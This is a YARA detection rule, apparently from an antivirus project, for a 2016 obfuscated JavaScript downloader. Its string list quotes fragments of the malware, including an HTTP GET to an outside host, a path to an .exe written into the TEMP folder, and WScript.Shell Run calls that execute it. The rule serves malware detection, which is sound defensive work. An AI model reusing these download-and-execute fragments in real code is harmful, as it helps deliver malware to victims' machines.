rule sig_20160328_38b9f1c53262eda05edc4405a80d8322 {
  meta:
    description = "datamaliciousorder - file 20160328_38b9f1c53262eda05edc4405a80d8322.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "66a1df65f592609c938acb562035994c8667e981ea8bb197e0de4cce0d14b19f"

  strings:
    $s1  = "function Lwetnazaxf() {return Plwql[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"ZC8tYnxpFqWOF.exe\";};" fullword ascii
    $s2  = "do {WScript[Fllntko](Dlbusd() * 11)} while (Rcvxr[\"readystate\"] < 2 * 2);" fullword ascii
    $s3  = "Rcvxr[Otgrninroc](\"GET\", \"http://perfect-nutrition.co.uk/lwqo9oa\", false);" fullword ascii
    $s4  = "var Plwql = function Oooegtvlq() {return WScript[Razhfnltzz](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Lcsdghph() {return ((Comtct == true) && (Comtct == Ubcvn)) ? 1 : Ioqyqrrn;};" fullword ascii
    $s6  = "var Comtct = false;" fullword ascii
    $s7  = "function Jcasuqi(Ntrdhi, Qdrkjrtun){return Ntrdhi - Qdrkjrtun;};" fullword ascii
    $s8  = "function Reluymhiv(Lahhf){Plwql[\"Run\"](Lahhf, Ioqyqrrn, Ioqyqrrn);};" fullword ascii
    $s9  = "Comtct = true; " fullword ascii
    $s10 = "function Dlbusd(){return 22;};" fullword ascii
    $s11 = "function Pdjxtnndj(){return Atakhueia;};" fullword ascii
    $s12 = "var Ubcvn = false;" fullword ascii
    $s13 = "function Dlddorrumf(){return Razhfnltzz;};" fullword ascii
    $s14 = "function Yhiqasts(Ttunamdqj) {var Zdffwjounb = (1, 2, 3, 4, 5, Ttunamdqj); return Zdffwjounb;};" fullword ascii
    $s15 = "Ubcvn = true; " fullword ascii
    $s16 = "function Qxypgqt()" fullword ascii
    $s17 = "var Jzrhtkku = false;" fullword ascii
    $s18 = " while (Aulsose){" fullword ascii
    $s19 = "var Wznlqrys = new this[\"Date\"]();" fullword ascii
    $s20 = "} catch(Hpvnlxjayt){Aulsose = (\"asdfa\", \"fadfasdf\", \"afdafa\", 2);};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}